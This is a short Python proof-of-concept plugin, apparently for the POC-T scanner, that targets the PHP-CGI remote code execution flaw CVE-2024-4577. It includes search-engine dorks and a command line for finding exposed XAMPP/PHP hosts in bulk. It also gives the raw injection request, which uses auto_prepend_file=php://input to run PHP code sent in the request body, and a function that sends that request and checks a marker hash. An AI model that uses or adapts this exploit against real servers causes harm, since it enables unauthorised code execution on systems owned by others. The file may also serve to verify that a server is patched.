#!/usr/bin/env python
# -*- encoding: utf-8 -*-
"""
@File    :   a
@DateTime :  2024/6/8 16:25 


@Dork
    app="XAMPP" || fid="52neBemtyULet5YwgYHnlg=="
OR
    banner="Win64" && banner="PHP" && banner="Apache" && country!="CN"

@Cmdline
    python POC-T.py -s php_cgi_rce_CVE-2024-4577.py -aF  ' app="XAMPP" && asn=4538'

@Request
```
POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
Content-Type: application/x-www-form-urlencoded

<?php echo md5("vulnerable"); ?>
```

@Expected Response
    contains "25890deab1075e916c06b9e1efc2e25f"
"""


from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log


def poc(url):
    url = urljoin_ex(url, "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input")
    resp = request_ex("post", url, headers={"Content-Type": "application/x-www-form-urlencoded"}, data='<?php echo md5("vulnerable"); ?>')

    if resp and resp.text.__contains__("25890deab1075e916c06b9e1efc2e25f"):
        return True
    else:
        return False
